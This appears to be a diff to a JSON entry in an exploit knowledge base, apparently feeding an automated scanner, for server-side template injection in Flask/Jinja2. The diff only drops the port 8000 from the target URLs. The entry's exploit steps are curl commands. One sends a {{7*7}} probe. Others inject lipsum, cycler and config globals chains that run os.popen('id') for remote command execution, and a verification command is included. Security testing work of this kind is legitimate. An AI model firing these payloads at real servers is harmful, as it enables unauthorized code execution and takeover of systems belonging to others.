@@ -23,38 +23,38 @@
     "/",
     "/?name={payload}"
   ],
-  "detection_method": "发送GET请求到http://{TARGET}:8000/?name={{7*7}}，如果响应中包含'49'或'Hello 49'，则存在SSTI漏洞",
+  "detection_method": "发送GET请求到http://{TARGET}/?name={{7*7}}，如果响应中包含'49'或'Hello 49'，则存在SSTI漏洞",
   "exploit_steps": [
     {
       "step": 1,
       "description": "验证SSTI漏洞是否存在",
-      "command": "curl -s -G --data-urlencode 'name={{7*7}}' http://{TARGET}:8000/",
+      "command": "curl -s -G --data-urlencode 'name={{7*7}}' http://{TARGET}/",
       "expected_result": "响应中包含'49'或'Hello 49'",
       "notes": "必须使用--data-urlencode避免花括号被shell解释"
     },
     {
       "step": 2,
       "description": "执行远程命令（使用lipsum链）",
-      "command": "curl -s -G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\" http://{TARGET}:8000/",
+      "command": "curl -s -G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\" http://{TARGET}/",
       "expected_result": "响应中包含命令执行结果，如'uid=0(root)'",
       "notes": "Jinja2沙箱中没有__import__，必须使用lipsum、cycler或config链"
     },
     {
       "step": 3,
       "description": "执行远程命令（使用cycler链）",
-      "command": "curl -s -G --data-urlencode \"name={{cycler.__init__.__globals__.os.popen('id').read()}}\" http://{TARGET}:8000/",
+      "command": "curl -s -G --data-urlencode \"name={{cycler.__init__.__globals__.os.popen('id').read()}}\" http://{TARGET}/",
       "expected_result": "响应中包含命令执行结果",
       "notes": "替代payload，优先级次于lipsum链"
     },
     {
       "step": 4,
       "description": "执行远程命令（使用config链）",
-      "command": "curl -s -G --data-urlencode \"name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" http://{TARGET}:8000/",
+      "command": "curl -s -G --data-urlencode \"name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" http://{TARGET}/",
       "expected_result": "响应中包含命令执行结果",
       "notes": "替代payload，优先级次于cycler链"
     }
   ],
-  "verification_command": "curl -s -G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\" http://{TARGET}:8000/",
+  "verification_command": "curl -s -G --data-urlencode \"name={{lipsum.__globals__['os'].popen('id').read()}}\" http://{TARGET}/",
   "verification_success_sign": "响应中包含命令执行结果，如'uid=0(root)'",
   "requires_callback": false,
   "callback_note": "",
@@ -67,7 +67,7 @@
     "jinja2",
     "template-injection"
   ],
-  "search_text": "Flask框架中Jinja2模板引擎因未过滤用户输入导致服务端模板注入，可导致远程代码执行 ssti Flask Jinja2 SSTI Server-Side Template Injection flask_ssti Flask Jinja2 Werkzeug Python Gunicorn 发送GET请求到http://{TARGET}:8000/?name={{7*7}}，如果响应中包含'49'或'Hello 49'，则存在SSTI漏洞 Flask 1.1.1及可能存在类似漏洞的版本 ssti rce python flask jinja2 template-injection 验证SSTI漏洞是否存在 执行远程命令（使用lipsum链） 执行远程命令（使用cycler链） 执行远程命令（使用config链）",
+  "search_text": "Flask框架中Jinja2模板引擎因未过滤用户输入导致服务端模板注入，可导致远程代码执行 ssti Flask Jinja2 SSTI Server-Side Template Injection flask_ssti Flask Jinja2 Werkzeug Python Gunicorn 发送GET请求到http://{TARGET}/?name={{7*7}}，如果响应中包含'49'或'Hello 49'，则存在SSTI漏洞 Flask 1.1.1及可能存在类似漏洞的版本 ssti rce python flask jinja2 template-injection 验证SSTI漏洞是否存在 执行远程命令（使用lipsum链） 执行远程命令（使用cycler链） 执行远程命令（使用config链）",
   "embedding": [
     0.14639811217784882,
     -0.029812416061758995,
